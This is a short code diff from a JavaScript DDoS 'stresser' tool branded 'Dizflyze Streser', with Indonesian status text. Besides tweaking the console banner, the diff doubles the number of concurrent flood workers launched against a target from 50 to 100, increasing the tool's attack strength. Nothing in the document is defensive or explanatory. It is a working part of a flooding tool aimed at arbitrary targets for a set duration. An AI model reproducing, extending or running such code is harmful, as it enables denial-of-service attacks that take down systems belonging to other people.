@@ -34,7 +34,7 @@ const N = async () => {
       addr: currentPort,
       region: 'ap'
     });
-    console.log(`${'🍁'.cyan} ${'╔═(api)Dizflyze Streser)\n ╚═➤ '.bold} ${url.underline().white}`);
+    console.log(`${'🍁'.cyan} ${'╔═(api)Dizflyze Streser)\n  ╚═➤ '.bold} ${url.underline}`);
     console.log(`${'🐥'.yellow} ${'[ MENUNGGU ]'.yellow}\n`);
     return url;
   } catch (e) {
@@ -153,7 +153,7 @@ const A = async (target, duration) => {
     } catch {}
   };
 
-  const workers = Array.from({ length: 50 }, () => new Promise(resolve => {
+  const workers = Array.from({ length: 100 }, () => new Promise(resolve => {
     flood();
     resolve();
   }));
